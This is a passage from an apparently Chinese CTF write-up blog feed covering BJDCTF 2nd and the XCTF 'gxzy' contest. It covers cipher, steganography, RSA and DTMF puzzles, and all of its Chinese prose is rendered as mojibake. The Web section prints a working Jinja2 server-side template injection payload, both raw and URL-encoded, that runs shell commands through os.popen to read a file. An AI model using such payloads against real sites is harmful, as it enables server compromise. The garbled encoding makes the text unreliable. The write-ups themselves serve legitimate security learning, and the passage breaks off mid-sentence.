gifã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/cat.gif" alt="cat"></p><p>8*10ï¼Œæƒ³åˆ°æ˜¯8ä½çš„ ASCIIï¼Œ10ä¸ªå­—ç¬¦ã€‚</p><p>01000010 æœç„¶æ˜¯ <code>B</code></p><p>01111011 æœç„¶æ˜¯ <code>{</code>ï¼Œä¹‹åæ˜¯</p><pre class="language-none"><code class="language-none">01001101 00100001 01100001 00110000 01111110 01111101</code></pre><p>äºæ˜¯å¾—åˆ°flagï¼š<code>BJD{M!a0~}</code></p><p>çœŸçš„æ˜¯å–µå–µå‘€ï¼</p><h3 id="çµèƒ½ç²¾é€š-y1ng"><a href="#çµèƒ½ç²¾é€š-y1ng" class="headerlink" title="çµèƒ½ç²¾é€š-y1ng"></a>çµèƒ½ç²¾é€š-y1ng</h3><blockquote><p>èº«ç»ç™¾æˆ˜çš„Y1ngå·²ç»è¾¾åˆ°å´‡é«˜çš„æ­¦æœ¯å¢ƒç•Œï¼Œä»¥è‡ªå¾‹å…‹å·±æ¥å–ä»£ç‹‚çƒ­è€…çš„æˆ˜æ–—ç‹‚æ€’ä¸ä¼ ç»Ÿçš„æˆ˜æ–—å½¢å¼ã€‚Y1ngæ‰€å—çš„è®­ç»ƒä¹Ÿè¿›ä¸€æ­¥å°†ä»–ä»¬çš„çµèƒ½å¼ºåŒ–åˆ°è¶³ä»¥ç“¦è§£å‘¨é­çš„ç‰©è´¨ä¸–ç•Œã€‚å€Ÿç”±é›†ä¸­è¿™è‚¡åŠ›é‡ï¼ŒY1ngèƒ½é‡Šæ”¾çµèƒ½èƒ½é‡é£æš´æ¥æ‘§æ¯æ•Œäººçš„å¿ƒæ™ºã€è‚‰ä½“ä¸å™¨æ¢°ã€‚</p></blockquote><p><img src="/2020/03/23/CTF_BJDCTF2nd/jpg.png"></p><p>ä¹‹å‰åªçŸ¥é“çŒªåœˆå¯†ç ï¼Œæ‰¾äº†åŠå¤©æ‰å‘ç°äº†è¿™ä¸ªç¼–ç ã€‚</p><p>åœ£å ‚æ­¦å£«å¯†ç  (Templar Cipher) æ˜¯å…±æµä¼šçš„â€œçŒªåœˆå¯†ç â€çš„ä¸€ä¸ªå˜ç§ï¼Œä¸€ç›´è¢«å…±æµä¼šåœ£æ®¿éª‘å£«ç”¨ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Templar_cipher.png" alt="Templar Cipher"></p><p>å¾—åˆ° <code>IMKNIGHTSTEMPLAR</code></p><p>æœ€ç»ˆ flag ä¸º <code>flag{IMKNIGHTSTEMPLAR}</code>ã€‚</p><h3 id="è€æ–‡ç›²äº†"><a href="#è€æ–‡ç›²äº†" class="headerlink" title="è€æ–‡ç›²äº†"></a>è€æ–‡ç›²äº†</h3><pre class="language-none"><code class="language-none">ç½¼é›§ç· çœ”æ“´çæ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µçœ”é¹é°</code></pre><p>è¿™é¢˜è¿˜ä»¥ä¸ºæ˜¯ä½›æ›°ï¼Œç»“æœå‘ç°ä¸æ˜¯â€¦â€¦</p><p>çœ‹åˆ°åˆ«äººæç¤ºå‘ç°çœŸçš„è ¢ï¼Œä¸‹æ¬¡å…ˆæ‹¿å»ç»™ç¿»è¯‘è¯»ä¸€éå°±çŸ¥é“ flag äº†ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_old_illiterate.png" alt="Crypto_old_illiterate"></p><p>å•Šä¸å¯¹- - </p><p>flag æ˜¯ <code>BJD{æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ}</code>ã€‚</p><h3 id="åœ£ç«æ˜­æ˜­-y1ng"><a href="#åœ£ç«æ˜­æ˜­-y1ng" class="headerlink" title="åœ£ç«æ˜­æ˜­-y1ng"></a>åœ£ç«æ˜­æ˜­-y1ng</h3><p>è¿™ä¸ªæ˜¯ä½›æ›°äº†ï¼Œä¸è¿‡æ˜¯æ–°ä½›æ›°ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Shenghuozhaozhao.png" alt="Crypto_Shenghuozhaozhao"></p><pre class="language-none"><code class="language-none">æ–°ä½›æ›°ï¼šè«¸å£½éš¸åƒ§å£½é™å½å£½è«¸å£½é™€å£½æ‘©éš¸åƒ§ç¼½è–©é¡˜å¿ƒå£½å’¤å£½å›‰å¯‚å£½é—è«¸å£½å“†å£½æ…§å£½èå£½è‰²å½æ„å£½æ‰€å£½èœœå¦‚</code></pre><p>æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°è§£å¯†ç½‘ç«™ã€‚ã€‚æ¥ï¼Œæ”¶è—å¤¹è¯·ã€‚</p><blockquote><p>æ–°ä½›æ›°ï¼š<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p><p>ä½›æ›°ï¼ˆä¸ä½›è®ºç¦…ï¼‰ï¼š<a href="http://keyfc.net/bbs/tools/tudoucode.aspx">http://keyfc.net/bbs/tools/tudoucode.aspx</a></p></blockquote><p>å¾—åˆ° <code>gemlovecom</code></p><blockquote><p>å¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é <strong>çŒœ</strong> </p><p>å› ä¸ºå‡ºé¢˜äººå¤±è¯¯æé”™äº†ï¼Œè§£å‡ºæ¥çš„keyå»æ‰å3ä½çš„com</p></blockquote><p>å»æ‰<code>com</code>å¥—ä¸Š <code>BJD</code> äº¤ä¸Šå»å‘ç°ä¸æ˜¯ã€‚</p><p>æƒ³åˆ°å¯èƒ½è¿™è¿˜æ˜¯ä¸ª key/å¯†é’¥ã€‚è¯•äº† F5 å‘ç°ä¸æ˜¯ã€‚</p><p>åæ¥çœ‹åˆ«äººçš„ WP æ‰çŸ¥é“æ˜¯ outguess å›¾åƒéšå†™ã€‚ï¼ˆå›å»è¡¥ä¸€è¡¥</p><blockquote><p>æ¥äº†æ¥äº†ã€‚</p><p>GitHub ä»“åº“ï¼š<a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a></p><blockquote><p>OutGuess is a universal steganographic tool that allows the insertion<br>of hidden information into the redundant bits of data sources.  The<br>nature of the data source is irrelevant to the core of OutGuess.  The<br>program relies on data specific handlers that will extract redundant<br>bits and write them back after modification.  In this version the PNM<br>and JPEG image formats are supported.  In the next paragraphs, images<br>will be used as concrete example of data objects, though OutGuess can<br>use any kind of data, as long as a handler is provided.</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/crorvick/outguess.git<span class="token builtin class-name">cd</span> outguess./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>ï¼ˆå¯èƒ½éœ€è¦ sudo</p><p>å¸¸ç”¨çš„æŒ‡ä»¤å°±åŠ å¯†å’Œè§£å¯†äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"my secret key"</span> -d hidden.txt demo.jpg out.jpg  <span class="token comment"># åŠ å¯†</span>outguess -k <span class="token string">"my secret key"</span> -r out.jpg hidden.txt  <span class="token comment"># è§£å¯†</span></code></pre></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"gemlove"</span> -r sheng_huo_zhao_zhao.jpg hidden.txt</code></pre><p>å¾—åˆ° flagï¼š</p><p> <code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p><h3 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h3><p>å™«ï¼Ÿï¼Ÿï¼Ÿ<strong>å•¥æ—¶å€™å‡ºçš„ RSAï¼Ÿæ²¡å‘ç°â€¦â€¦</strong></p><p>æ¥è¡¥ä¸€ä¸‹å§ã€‚nc è¿ä¸Šï¼Œ<del>æ€§æ„Ÿxx</del>åœ¨çº¿å‘é¢˜ã€‚ï¼ˆé¢˜ç›®æ¯ä¸ªç¯å¢ƒå¥½åƒä¸åŒï¼‰</p><pre class="language-none"><code class="language-none">e=8490247p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728p-q=306146015710299885882907488963590997669550770952584505436005104300551321544811637977008351542375001985864015345039058904779091905194377534370393296886314c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888flag=??????</code></pre><p>åˆ†åˆ«æ±‚å¾—</p><pre class="language-none"><code class="language-none">p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre><p>è€Œååˆ©ç”¨ <code>m = pow(c, d, p*q)</code> æ±‚å¾—</p><pre class="language-none"><code class="language-none">m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</code></pre><p>è½¬ Hex å†è½¬ ASCIIï¼Œå¾—åˆ° flag</p><p><code>flag{656092c1-50bb-459c-89ec-4cabc69b4f3e}</code></p><blockquote><p>ä¹Ÿå¯ä»¥ç”¨ <code>long_to_bytes</code>ï¼ˆéœ€è¦å®‰è£…å¯†ç åº“ <code>pip install pycryptodome</code>ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">print</span><span class="token punctuation">(</span>number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æƒ³èµ·æ¥ä¹‹å‰è¯´è¦è£… GitHub ä¸Šé‚£ä¸ª python çš„ <a href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-tool</a> è¿˜æ²¡è£…â€¦â€¦</p></blockquote><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><p>nc è¿ä¸Šï¼Œå¾—åˆ°é¢˜ç›®ã€‚</p><pre class="language-none"><code class="language-none">e=12907381p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157flag=??????</code></pre><p>å†æ¥ä¸€æ¬¡</p><pre class="language-none"><code class="language-none">e=10288339p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550flag=??????</code></pre><p>p å’Œ q ä¸å˜ï¼Œåˆ™ </p><p>$$<br>n = p*q = \frac{p^2 + q^2 - (p-q)^2}{2}<br>$$</p><p>ä¸å˜ï¼Œè€ƒè™‘æ˜¯<strong>å…±æ¨¡æ”»å‡»</strong>ï¼Œåé¢æ¥å¡«å‘ã€‚<em>ï¼ˆç­‰æˆ‘è£…ä¸Š RSA tools</em></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>è¿™æ¬¡æ²¡æ€ä¹ˆçœ‹ Web é¢˜â€¦â€¦ï¼ˆï¼ˆ</p><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>çœ‹åˆ°è¿”å›çš„é¡µé¢ä¸Šæœ‰ä¸ªæ³¨é‡Š</p><p><code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p><p>è¯•äº†ä¸€ä¸‹<code>{{1-1}}</code>å¯ä»¥å¾—åˆ° 0ï¼Œäºæ˜¯å°±æ˜¯ SSTI äº†ã€‚å¥½åƒéƒ½ä¸éœ€è¦ç»•è¿‡ã€‚</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("cd /;cat flag").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}</code></pre><pre class="language-none"><code class="language-none">http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}</code></pre><p><code>flag{8c252513-5c42-47fd-95b5-4d13a986e6d0}</code></p><p>ï¼ˆè²Œä¼¼æ˜¯åŠ¨æ€ flag</p><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>â€‹    <img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster.jpg" alt="Web_elementmaster"></p><p>æ‰‹ç»˜çš„å”‰ï¼ˆé‡ç‚¹ä¸å¯¹</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster2.jpg" alt="source"></p><p>è¿™é‡Œçš„<code>id</code>è½¬ ASCII å¾—åˆ° <code>Po.php</code>ã€‚</p><p>è®¿é—®å‘ç°å†…å®¹æ˜¯ä¸€ä¸ª <code>.</code>ï¼Œæ‡µäº†ã€‚</p><p>ç»™äº† hint è¯´<code>mendeleev=é—¨æ·åˆ—å¤«</code>ï¼Œè¿˜æœ‰ <code>from requests import *</code> ã€‚</p><p>æœ€åæ”¾äº†å…ƒç´ å‘¨æœŸè¡¨â€¦â€¦è¿™è„‘æ´çœŸæ²¡æƒ³åˆ°ã€‚ã€‚</p><p>å°±æ˜¯ç”¨å…ƒç´ å‘¨æœŸè¡¨çš„å…ƒç´ å»è·‘<code>xx.php</code>å•¦ã€‚<em>ï¼ˆéš¾æ€ªæ‰«æå™¨æ²¡ç”¨</em></p><h2 id="æ”¶ä¸ªå°¾"><a href="#æ”¶ä¸ªå°¾" class="headerlink" title="æ”¶ä¸ªå°¾"></a>æ”¶ä¸ªå°¾</h2><p>æ„Ÿè§‰è¿™æ¬¡ Crypto å’Œ Misc é¢˜ç›®æœ¬æ¥å°±ä¸æ€ä¹ˆéš¾ï¼Œç„¶è€Œåšèµ·æ¥æ„Ÿè§‰æ¯”è¾ƒä½›ç³»ï¼Œç›´æ¥ç›²ç›®ä¸Šæ‰‹ï¼Œæ€è·¯ä¸å¤§å¯¹ï¼Œè¿˜æ‡’ã€‚</p><p>æœ‰æŒºå¤šå¥—è·¯æ²¡æ¥è§¦è¿‡çš„ï¼Œè„‘æ´è¿˜è¦å¤§ä¸€ç‚¹å‘¢ï¼Œåé¢æœ‰ç©ºå†ç†ä¸€ä¸‹åšé¢˜çš„æ€è·¯å§ã€‚</p><p>å™¢ï¼Œå®˜æ–¹ WP ä¹Ÿå‡ºæ¥äº†ï¼Œ<a href="https://github.com/BjdsecCA/BJDCTF2020_March">æˆ³è¿™é‡Œ</a>å§ã€‚</p><p>å˜¤ï¼Œè¿˜æœ‰ä¸€å †ä½œä¸šæ²¡è¡¥ã€‚</p><p>æºœäº†æºœäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› WriteUp</title>
      <link href="2020/03/15/CTF_2020XCTF_gxzy/"/>
      <url>2020/03/15/CTF_2020XCTF_gxzy/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/03/15/CTF_2020XCTF_gxzy/poster.jpg" alt="poster"></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šä¸Šå‘¨çœ‹åˆ°äº†è¿™ä¸ª XCTF çš„é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›ï¼Œè§‰å¾—æœ‰ç‚¹æ„æ€å¯ä»¥ç©ä¸€ä¸‹ã€‚</p><p>äºæ˜¯ä¸Šå‘¨æœ«å°±æ°´äº†ä¸€ä¸‹ï¼Œç„¶è€Œå•¥ä¹Ÿä¸ä¼šèœåˆ°çˆ†ç‚¸ï¼Œéƒ½æ²¡å‡ é“é¢˜ä¼šåšâ€¦â€¦<em>ï¼ˆåé¢è¿˜<del>è¡¥ä½œä¸š</del>çæŠ˜è…¾å»äº†</em></p><p>æœ€è¿‘çœ‹äº†çœ‹å¤§ä½¬ä»¬çš„ WPï¼Œä¼°è®¡åœ¨ä»–ä»¬çœ¼é‡Œéƒ½æ˜¯ç­¾åˆ°é¢˜å§ï¼Œå•¥ä¹Ÿä¸è¯´ç›´æ¥ä¸¢ä¸€ä¸ª payload æå®šèµ°äººï¼ˆawslã€‚</p><p>ä¸è¿‡è¿˜æ˜¯æœ‰ç‚¹æ„Ÿå—æˆ–è€…å…¶ä»–æ–¹é¢çš„æ”¶è·ä¹‹ç±»çš„ï¼Œé¡ºä¾¿æ¥å­¦ç‚¹ä¸œè¥¿ï¼Œéšä¾¿å†™ä¸€ç‚¹å§ã€‚</p><p><strong>å®˜æ–¹ WPï¼š</strong> <a href="./gxzy-WP.pdf">ç‚¹è¿™é‡Œä¸‹è½½</a>   <em>ï¼ˆç‰ˆæƒå½’å®˜æ–¹æ‰€æœ‰ï¼‰</em></p><blockquote><p>å¥½åƒå¥½å¤šç¯å¢ƒéƒ½å…³äº†ã€‚</p><p>ï¼ˆè¯è¯´è¿™ç¯‡æ–‡ç« ä¸¢ draft é‡Œå¥½ä¹…äº†å”‰ï¼Œå†ä¸å‘å°±è¦é•¿è‰äº†ã€‚</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h3><p>çœŸÂ·ç­¾åˆ°</p><p><code>flag{shijiejiayou}</code></p><p>æ­¦æ±‰åŠ æ²¹ï¼ä¸­å›½åŠ æ²¹ï¼ä¸–ç•ŒåŠ æ²¹ï¼</p><br><h3 id="ç®€å•MISC"><a href="#ç®€å•MISC" class="headerlink" title="ç®€å•MISC"></a>ç®€å•MISC</h3><p>å‹ç¼©åŒ…é‡Œæœ‰ä¸€ä¸ª<code>flag.zip</code>ï¼ˆåŠ å¯†ï¼‰ å’Œä¸€ä¸ª<code>photo.jpg</code>ï¼ˆæ‰“ä¸å¼€ï¼‰ã€‚ </p><p><code>photo.jpg</code> ç»è¿‡æå–å¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ã€‚</p><p>é‡Œé¢æœ‰ä¸€ä¸ª <code>ctf.txt</code> æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯</p><pre class="language-none"><code class="language-none">./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code></pre><p>ä¸€çœ‹æ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°</p><p><code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p><p>ï¼ˆå—¯ EPIDEMIC  SITUATION  OF  UNIVERSITY  WAR å˜›ã€‚é«˜æ ¡æˆ˜ç–«å•¦ã€‚</p><p>ä½œä¸ºå¯†ç ï¼Œè§£å‹<code>flag.zip</code>æ–‡ä»¶ï¼Œå¾—åˆ°<code>flag.txt</code></p><p><code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code></p><p>base64è§£å¯†å¾—åˆ°flagï¼š</p><p><code>Th1s_is_FlaG_you_aRE_rigHT</code></p><br><h3 id="éšè—çš„ä¿¡æ¯"><a href="#éšè—çš„ä¿¡æ¯" class="headerlink" title="éšè—çš„ä¿¡æ¯"></a>éšè—çš„ä¿¡æ¯</h3><p>å‹ç¼©åŒ…é‡Œæœ‰ä¸ª<code>äºŒç»´ç .jpg</code>ï¼Œä»¥åŠ <code>çº¯æ•°å­—.zip</code>ã€‚</p><p>å…¶ä¸­å‹ç¼©åŒ…åŠ å¯†äº†ã€‚</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode.jpg" alt="äºŒç»´ç "></p><p>å‘ç°äºŒç»´ç è¢«æ‰£æ‰äº†ä¸‰ä¸ªå®šä½è„šè€Œä¸”åè‰²äº†ï¼Œäºæ˜¯è¡¥å…¨</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode2.jpg" alt="äºŒç»´ç _ä¿®å¤å"></p><p>æ‰«ç å¾—åˆ°ï¼ˆå¯èƒ½è¡¥å¾—ä¸æ˜¯å¾ˆå¥½ï¼Œä½†å‘ç°æ‰‹æœº QQ çš„æ‰«ç çœŸçš„å¼º</p><pre class="language-none"><code class="language-none">flag{this_is_also_not_flag} è§£å‹å¯†ç ä¸åœ¨è¿™é‡Œ0.0ï¼</code></pre><p>å‡çš„flagï¼å‘ç°å¹¶ä¸èƒ½è§£å‹ã€‚</p><p>åŒæ—¶åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨é‡Œçœ‹åˆ°æœ€åæœ‰ä¸€æ®µå­—ç¬¦ä¸²ï¼š<code>TOGETYOURFLAG</code>ã€‚<em>ï¼ˆæœ‰ç‚¹æ‡µï¼Œå¥½åƒæ²¡å•¥ç”¨çš„äºšå­</em></p><p>å†çœ‹å›å‹ç¼©åŒ…ï¼Œæ ¹æ®æ–‡ä»¶å <code>çº¯æ•°å­—</code>ï¼Œäºæ˜¯æš´åŠ›è·‘äº†ä¸€æ³¢ï¼Œç„¶è€Œå¹¶ä¸è¡Œã€‚</p><p>äºæ˜¯æƒ³åˆ°<strong>ä¼ªåŠ å¯†</strong>ï¼Œæœç„¶å¦‚æ­¤ã€‚</p><p>è§£å‹å¾—åˆ°<code>éšè—çš„ä¿¡æ¯.wav</code>ï¼ŒéŸ³é¢‘å†…å®¹å¤§æ¦‚å°±æ˜¯ <code>æˆ‘çš„æ­¦æ±‰å°½å¿«å¥½èµ·æ¥</code> ä¹‹ç±»çš„ï¼ŒæŒºåº”æ™¯çš„ï¼Œä¹ŸæŒºåŠ±å¿—çš„ã€‚</p><p>åœ¨éŸ³é¢‘æœ€åå‘ç°äº†æ¯”è¾ƒå¾®å¼±çš„<strong>æ‹¨å·å£°éŸ³</strong>ï¼Œçœ‹äº†çœ‹é¢‘åŸŸï¼Œå‘ç°äº†å¦‚ä¸‹çš„é¢‘è°±ã€‚ï¼ˆåœ¨æœ€å‰é¢å’Œæœ€åé¢éƒ½æœ‰è¿™æ ·çš„ä¿¡å·ï¼‰</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/spectrum.png" alt="spectrum"></p><p>æ¯ä¸ªæ‹¨å·å£°ç”±ä¸¤ä¸ªé¢‘ç‡å åŠ è€Œæˆã€‚</p><p>æƒ³èµ·æ¥åˆšæ”¾å¯’å‡çš„æ—¶å€™æœ‰ä¸ªå­¦å¼Ÿè¿˜é—®è¿‡æ‹¨å·çš„åŸç†ï¼Œé‚£æ—¶å€™è¿˜ç­”ä¸ä¸Šæ¥ï¼ŒæŸ¥äº†åŠå¤©æ²¡æ‰¾åˆ°åˆé€‚çš„èµ„æ–™ã€‚</p><p>è¿™æ¬¡å†å»è°·æ­ŒæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°åŸæ¥è¿™å«åš <strong>DTMF ä¿¡å·</strong>ã€‚</p><blockquote><p><strong><a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91">åŒéŸ³å¤šé¢‘ä¿¡å·</a>ï¼ˆDual-Tone Multi-Frequency, DTMFï¼‰</strong>ï¼Œç”µè¯ç³»ç»Ÿä¸­ç”µè¯æœºä¸äº¤æ¢æœºä¹‹é—´çš„ä¸€ç§ç”¨æˆ·ä¿¡ä»¤ï¼Œæœ€å¸¸ç”¨äºå‘æ‹¨å·æ—¶é€è¢«å«å·ç ã€‚</p><p>åŒéŸ³å¤šé¢‘çš„æ‹¨å·é”®ç›˜æ˜¯4Ã—4çš„çŸ©é˜µï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ª<em>é«˜</em>é¢‘ï¼Œæ¯ä¸€åˆ—ä»£è¡¨ä¸€ä¸ª<em>ä½</em>é¢‘ã€‚æ¯æŒ‰ä¸€ä¸ªé”®å°±å‘é€ä¸€ä¸ª<em>é«˜</em>é¢‘å’Œ<em>ä½</em>é¢‘çš„æ­£å¼¦ä¿¡å·ç»„åˆï¼Œæ¯”å¦‚â€™1â€™ç›¸å½“äº697å’Œ1209èµ«å…¹ï¼ˆHzï¼‰ã€‚äº¤æ¢æœºå¯ä»¥è§£ç è¿™äº›é¢‘ç‡ç»„åˆå¹¶ç¡®å®šæ‰€å¯¹åº”çš„æŒ‰é”®ã€‚</p><p><em>ï¼ˆæ¥è‡ªç»´åŸºç™¾ç§‘ï¼‰</em></p></blockquote><table><thead><tr><th align="center"></th><th align="center">1209 Hz</th><th align="center">1336 Hz</th><th align="center">1477 Hz</th><th align="center">1633 Hz</th></tr></thead><tbody><tr><td align="center">697 Hz</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">A</td></tr><tr><td align="center">770 Hz</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">B</td></tr><tr><td align="center">852 Hz</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">C</td></tr><tr><td align="center">941 Hz</td><td align="center">*</td><td align="center">0</td><td align="center">#</td><td align="center">D</td></tr></tbody></table><p>æœ¬æ¥æƒ³åˆ©ç”¨ç½‘ç»œä¸Šåœ¨çº¿çš„è§£ç å·¥å…·ï¼Œç„¶è€Œå‘ç°ç½‘ç«™ä¸æ˜¯ä¸Šä¸å»å°±æ˜¯åœæ­¢æœåŠ¡äº†ã€‚ï¼ˆå™—</p><p>é‚£è¿˜æ˜¯è‡ªå·±æ¥å§ã€‚</p><p>å¯¹äºæ¯ä¸€ä½å·ç åˆ†åˆ«æŸ¥çœ‹é¢‘è°±ï¼Œæ ¹æ®æœ€æ¥è¿‘çš„ä½é¢‘å’Œé«˜é¢‘ä¿¡å·å¯¹åº”äºè¡¨æ ¼å†…çš„æ•°å­—/å­—æ¯ã€‚ï¼ˆæŒºä½©æœç›´æ¥å°±å¬å‡ºæ¥çš„å¤§ä½¬</p><p>å¾—åˆ°éŸ³é¢‘æœ€åé¢è¿™å‡ ä¸ªæ•°å­—ä¸º <code>5618521</code>ï¼Œæœ€å‰é¢çš„å‡ ä¸ªä¸º <code>18748</code>ã€‚</p><p>å‡‘æˆ <code>flag{187485618521}</code> äº¤ä¸Šå»ï¼Œä¸å¯¹ï¼</p><p>éš¾é“ä¸¤éƒ¨åˆ†åäº†ï¼Ÿäºæ˜¯å€’è¿‡æ¥å†è¯•ï¼Œä¸è¡Œã€‚</p><p>éš¾é“è¦å€’å™ï¼Ÿä¸è¡Œã€‚</p><p>éš¾é“æ˜¯å­—æ¯ï¼Ÿäºæ˜¯è½¬æˆé”®ç›˜ä¸Š1-0å¯¹åº”ç€ä¸‹é¢çš„ä¸€è¡Œå­—æ¯ï¼Œè¯•äº†è¯•ï¼Œä¸è¡Œã€‚</p><p>éš¾é“æ˜¯å“ªä¸ªæ•°å­—æé”™äº†ï¼Ÿï¼Ÿï¼Ÿå†ç¡®è®¤äº†ä¸€éï¼Œé˜Ÿå‹ä¹Ÿç¡®è®¤äº†ä¸€éï¼Œå°±æ˜¯è¿™ä¸ªå•Šï¼ˆé»‘è„¸ã€‚</p><p>Base64 è§£ç ä¸€ä¸‹ï¼Œä¸å¯¹ä¸å¯èƒ½ã€‚</p><p>äºæ˜¯å¡åœ¨è¿™é‡Œäº†ã€‚</p><blockquote><p>çœ‹åˆ°åˆ«äºº WP çš„æ—¶å€™å‘ç°è ¢æ­»äº†ï¼Œæƒ³åˆ° base64 è§£ç æ²¡æƒ³åˆ°åè¿‡æ¥ç¼–ç 